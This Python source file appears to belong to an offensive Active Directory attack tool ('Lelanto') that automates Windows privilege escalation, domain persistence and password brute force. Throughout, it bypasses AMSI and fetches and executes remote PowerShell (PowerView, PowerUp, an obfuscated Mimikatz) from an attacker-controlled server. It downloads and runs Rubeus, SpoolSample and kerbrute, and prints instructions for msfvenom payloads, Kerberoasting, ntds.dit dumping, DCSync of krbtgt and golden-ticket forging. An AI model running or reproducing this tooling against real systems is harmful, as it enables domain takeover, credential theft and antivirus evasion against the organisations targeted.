from lib.config import *
import time,os,sys,subprocess
import win32com.shell.shell as shell



def stepFOUR_PrivilegeEsc():
    print(f"\n{ok} 3-Starting with check vulnerabilities to elevate privileges ...\n")
    print(f"{warning} A- Check Unquoted path services vulnerabilities...")
    checking=0
    while(checking==0):
        time.sleep(2)
        print(f"{ok} Bypassing AMSI Security...\n")
        bypass=configurazione()
        command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerUp.ps1')" + "; "
        #command0=bypass + "; " + f"Import-Module {data}PowerUpOb.ps1" + "; "
        command1=command0 + " Get-UnquotedService | select Path,ServiceName"
        try:
            value=powershell_commandLine(command1)
            value=cleanstring(value)
            value=value.split("\n")
            if(len(value) == 1):
                print(f"{error} No service unquoted FOUND")
                checking=1
            else:
                print(f"{ok} Service unquoted FOUND\n")
                time.sleep(2)
                print(f"{ok} How can you exploit this vuln...\n")
                print(f"{ok} A-Create with msfvenom a payload to add new user")
                print(f"{ok} B-msfvenom -p windows/adduser USER=fregato PASS=Orologio96@ -f exe > vulnservice.exe")
                print(f"{ok} C-Put the malicious file inside the first dir of the vulnerable service path")
                print(f"{ok} D-Rename with the name of that dir and reload the machine")
                x=input(f"{ok} When you finished press ENTER..\n")
                checking=2
        except Exception as e:
            print(f"{error} No service unquoted FOUND")
            checking=1
    
    time.sleep(1)
    print(f"\n{warning} B- Check Writeable Service Executable...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerUp.ps1')" + "; "
    command1=command0 + " Get-ModifiableServiceFile"
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No Writeable service executable FOUND")
        else:
            print(f"{ok} Writeable service executable FOUND\n")
            time.sleep(2)
            print(f"{ok} How can you exploit this vuln...\n")
            print(f"{ok} A-Create with msfvenom a payload to add new user")
            print(f"{ok} B-msfvenom -p windows/adduser USER=fregato PASS=Orologio96@ -f exe > vulnservice.exe")
            print(f"{ok} C-Put the malicious payload inside the dir of the vulnerable service changing the name of the service with the victim's name")
            print(f"{ok} D-Rename with the name of that dir and reload the machine")
            x=input(f"{ok} When you finished press ENTER..\n")
    except Exception as e:
        print(f"{error} No Writeable service executable FOUND")
    
    
    time.sleep(1)
    print(f"\n{warning} C- Check AS-REP Roasting on the domains...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
    command1=command0 + 'Get-DomainUser -PreauthNotRequired | select displayname,userprincipalname,useraccountcontrol '
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No users with preauthnotrequired FOUND\n")
           
        else:
            print(f"\n{ok} Users with preauthnotrequired FOUND\n")
            print(f"{ok} 1- GETNPUsers MARVEL.local/jsmith -dc-ip=192.168.73.137 ")
            print(f"{ok} 2- Save the password in a file called tgt")
            print(f"{ok} 3- Use John or whatever bruteforce tool to crack password offline: sudo john tgt --wordlist=rockyou")
            x=input(f"{ok} When you finished press ENTER..\n")
    except Exception as e:
        print(f"{error} General Error: {e}")

    time.sleep(1)
    
    print(f"\n{warning} D- Check abuse Kerberoasting...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
    command1=command0 + 'Get-NetUser -SPN | select serviceprincipalname '
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"{error} No Service Account  FOUND\n")
            
        else:
            print(f"\n{ok} Service Account FOUND\n")
            print(f"{ok} First Way")
            print(f"{ok} 0- From Kali, if you have already an account in the domain")
            print(f"{ok} 1- GETUserSPN -dc-ip 192.168.73.137 MARVEL.local/(account in the domain) -request ")
            print(f"{ok} 2- Save the TGS encrypted in a file like hash.txt")
            print(f"{ok} 3- hashcat -m 13100 -a 0 hash.txt password --force")
            x=input(f"{ok} When you finished press ENTER..\n")
            print("\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
            print(f"{ok} Second Way")
            bypass=configurazione()
            command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
            command1=command0 + 'Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat '
            try:
                value=powershell_commandLine(command1)
                value=cleanstring(value)
                print(value)
                value=value.split("\n")
                if(len(value) == 1):
                    print(f"\n{error} No Hashcat TGS FOUND\n")
                else:
                    print(f"\n{ok} Hashcat TGS FOUND\n")
                    x=input(f"{ok} When you finished press ENTER..\n")
            except Exception as e:
                print(f"{error} General Error: {e}")
    except Exception as e:
        print(f"{error} General Error: {e}")

    time.sleep(1)

    print(f"\n{warning} E- Check SeBackupPrivilege to Windows PrivEsc...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
    command1=command0 + 'Get-NetGroupMember -Name "Backup Operators" | select MemberName'
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value=value.split("\n")
        if(len(value) == 1):
            print(f"\n{error} No users in Backup Operators FOUND\n")
        else:
            print(f"\n{ok} User in Backup Operators FOUND\n")
            time.sleep(2)
            command1=command0 + 'Get-NetGroupMember -FullData -Name "Remote Management Users" | select MemberName'
            value=powershell_commandLine(command1)
            value=cleanstring(value)
            print(value)
            value=value.split("\n")
            if(len(value) == 1):
                print(f"\n{error} No users in Remote Management Users FOUND\n")
            else:
                print(f"\n{ok} User in Remote Management Users FOUND\n")
                print(f"{ok} You can exploit the vulnerability of SeBackupPrivilege to dump ntds.dit and system to get hash")
                print(f"{ok} A- Get password of this\\these victim account")
                print(f"{ok} B- From Kali use evil_winrm -i <IP DC> -u <usernameVictim> -p <passwordVictim>")
                print(f"{ok} C- Use diskshadow in order to copy ntds.dit: diskshadow /s raj.dsh ")
                print(f"{ok} D- robocopy /b z:\windows\\ntds . ntds.dit")
                print(f"{ok} E- reg save hklm\\system system")
                print(f"{ok} F- download ntds.dit and download system")
                print(f"{ok} G- On kali: Secretdump -ntds ntds.dit -system system local")
                print(f"{ok} H- On kali: evil_winrm -i <IP DC> -u Administrator -H '<admin hash>'")
                x=input(f"{ok} When you finished press ENTER..\n")
    except Exception as e:
        print(f"{error} General Error: {e}")


    print(f"\n{warning} F- Unconstrained Delegation ")
    print(f"{ok} For this techniques may be necessary disable AV..")
    x=input(f"{ok} When you finished press ENTER..\n")
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
    command1=command0 + 'Get-NetComputer -UnConstrained | select Name'
    try:
        value=powershell_commandLine(command1)
        undomain=cleanstring(value)
        print(undomain)
        undomain=undomain.split("\n")
        if(len(undomain) == 1):
                print(f"\n{error} No domain computers which unconstrained delegation FOUND\n")
        else:
            print(f"\n{ok} Domain computers which unconstrained delegation FOUND")
            command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/Rubeus.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe')"
            value=powershell_commandLine(command1)
            command=f"C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe monitor /interval:1"
            final_command=f'start cmd.exe @cmd /k "{command}"'
            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ final_command)
            command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/SpoolSample.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\SpoolSample.exe')"
            value=powershell_commandLine(command1)
            bypass=configurazione()
            command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
            command12=command0 + " Get-NetDomain"
            value=powershell_commandLine(command12)
            value=cleanstring(value)
            value_list=value.split("\n")
            domain=value_list[-1].split(":")[1].rstrip().strip()
            print(f"Domain: {domain}")
            DC=input(f"{warning} Insert DC: ")
            VulnMachine=input(f"{warning} Insert Machine with delegation enables: ")
            command=f"C:\\Users\\{username}\\Desktop\\Lelanto\\SpoolSample.exe {DC} {VulnMachine}"
            os.system(command)
            x=input(f"\n{warning} Press ENTER when the process will finish...")
            shell.ShellExecuteEx(lpVerb='runas', lpFile='cmd.exe', lpParameters='/c '+ f"del C:\\Users\\{username}\\Desktop\\Lelanto\\Rubeus.exe")


    except Exception as e:
        print(f"{error} General Error: {e}")



def stepFIVE_DomainPersistence():
    print(f"\n{ok} 4-Starting with Domain Persistence...\n")
    print(f"{ok} For this techniques may be necessary disable AV..")
    x=input(f"{ok} When you finished press ENTER..\n")
    print(f"{warning} A- Check abuse Directory Services Restore Mode (DSRM)")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    #bypass=configurazione()
    #command0=bypass + "; " + f"Import-Module {data}PowerUp.ps1" + "; "
    command1=' Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"'
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        value=value.split("\n")
        dsrmvalue=99
        for item in value:
            if "DsrmAdminLogonBehaviour" in item:
                dsrmvalue=int(item.split(":")[1].strip())
                if dsrmvalue!=2:
                    print(f"{error} Is not possible to allow login into DC using DSRM hash")
                else:
                    print(f"{ok} DsrmAdminLogonBehaviour has value 2. It is possible use DSRM hash to login into DC")
                    
        
        if dsrmvalue == 99:
            print(f"{error} DsrmAdminLogonBehaviour not present...")
    except Exception as e:
        print(f"{error} General error: {e}")
    
    print(f"\n{warning} B- Get Golden Ticket using krbtgt...")
    time.sleep(1)
    print(f"{ok} Bypassing AMSI Security...\n")
    bypass=configurazione()
    command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
    command1=command0 + 'Get-NetGroupMember -Name "Domain Admins"'
    try:
        value=powershell_commandLine(command1)
        value=cleanstring(value)
        print(value)
        value2=value.split("\n")
        if(len(value2) == 1):
            print(f"\n{error} No users in Domain Admins FOUND\n")
        else:
            print(f"\n{ok} Users in Domain Admins FOUND\n")
            value=powershell_commandLine("whoami")
            value=cleanstring(value)
            account=value.split("\\")[1]
            trovato=0
            for item in value2:
                if("MemberName" in item):
                    member=item.split(":")[1].strip()
                    if account==member:
                        trovato=1
                        print(f"{ok} This account can get golden ticket")
                        time.sleep(1)
                        #value=powershell_commandLine("Get-Content C:\\Users\\tony_stark\\Desktop\\Lelanto\\data\\prova3.txt")
                        #stringa=cleanstring(value)
                        mimikatz_final1=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/mimi.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
                        value=powershell_commandLine(mimikatz_final1)
                        value=cleanstring(value)
                        print(value)
                        #mimikatz_final=bypass + "; " + f"IEX(New-Object Net.WebClient).DownloadString('http://{IpServer}/pluto.ps1')" + "; Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"'"
                        #value=powershell_commandLine(mimikatz_final)
                        #value=cleanstring(value)
                        command22=command0 + " Get-DomainSID"
                        value=powershell_commandLine(command22)
                        domainSID=cleanstring(value)
                        command12=command0 + " Get-NetDomain"
                        value=powershell_commandLine(command12)
                        value=cleanstring(value)
                        value_list=value.split("\n")
                        domain=value_list[-1].split(":")[1].rstrip().strip()
                        
                        ntlm=input(f"{warning} Insert NTLM HASH of krbtgt: ")
                        commandMimikatz= bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1')" + f"; Invoke-Mimidogz -Command '\"  kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt\"'"
                        #commandMimikatz=bypass + "; " + stringa +  + f"; Invoke-Mimidogz -Command '\"  kerberos::golden /domain:{domain} /sid:{domainSID} /rc4:{ntlm} /id:500 /user:{account} /ptt\"'"
                        value=powershell_commandLine(commandMimikatz)
                        value=powershell_commandLine("klist")
                        value=cleanstring(value)
                        print(value)
                        print(f"\n{ok} 1- > net use S: \\<DC Name>.<Domain>.local\C$\n\t2- > S:\n\t3- You have a shell inside the DC..")
                        
            
            if(trovato==0):
                print(f"{error} This account cannot get golden ticket")
            
    except Exception as e:
        print(f"{error} General Error: {e}")
        print(f"{warning} Sometimes this exception it caused by LELANTO. Copy this command on terminal e press enter:\n\n{bypass};iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/Invoke-Mimikatz.ps1');Invoke-Mimidogz -Command '\"lsadump::dcsync /domain:marvel.local /user:krbtgt\"' ")
    
  
    '''
    print(f"{warning} Check if this domain user has access to a server where a domain admin is logged in...")
    print(f"{ok} Invoke-UserHunter take a few minutes to check all machines...")
    command0=bypass + "; " + f"Import-Module {data}PowerViewOb.ps1" + "; "
    command1=command0 + " Invoke-UserHunter -CheckAccess"
    value=powershell_commandLine(command1)
    value=cleanstring(value)
    value=value.split("\n")
    for item in value:
        if "LocalAdmin" in item:
            if "true" in item:
                print(f"{ok} This current account has local admin access in ")
    '''




def stepSIX_BruteForce():
    x=input(f"\n{warning} Do you want starting bruteforce on a specific account in the AD 1-YES  2-NO: ")
    x=int(x)
    if x==2:
        print(f"{ok} Skip bruteforce attacks..")
    else:
        print(f"\n{ok} 5-Starting with Bruteforce on a specific username ...\n")
        print(f"{ok} For this techniques may be necessary disable AV..")
        x=input(f"{ok} When you finished press ENTER..\n")
        account=input(f"\n{warning} Insert account's name: ")
        bypass=configurazione()
        command0=bypass + "; " + f"iex (New-Object Net.WebClient).DownloadString('http://{IpServer}/PowerView.ps1')" + "; "
        command12=command0 + " Get-NetDomain"
        value=powershell_commandLine(command12)
        value=cleanstring(value)
        value_list=value.split("\n")
        domain=value_list[-1].split(":")[1].rstrip().strip()
        command1=f"(New-Object Net.WebClient).DownloadFile('http://{IpServer}/kerbrute.exe','C:\\Users\\{username}\\Desktop\\Lelanto\\kerbrute.exe')"
        value=powershell_commandLine(command1)
        command=f"kerbrute.exe bruteuser -d {domain} {list_password} {account} -v"
        final_command=f'start cmd.exe @cmd /k "{command}"'
        os.system(final_command)
        x=input(f"\n{warning} Press ENTER when the process will finish...")
        os.system("del kerbrute.exe")
        

if __name__=="__main__":
    title()
    time.sleep(2)
    stepONE_setupPolicy()
    time.sleep(1)
    print("\n============================================================================\n")
    StepTHREE_Enumeration()
    time.sleep(1)
    print("\n============================================================================\n")
    stepFOUR_PrivilegeEsc()
    time.sleep(1)
    print("\n============================================================================\n")
    stepFIVE_DomainPersistence()
    time.sleep(1)
    print("\n============================================================================\n")
    stepSIX_BruteForce()

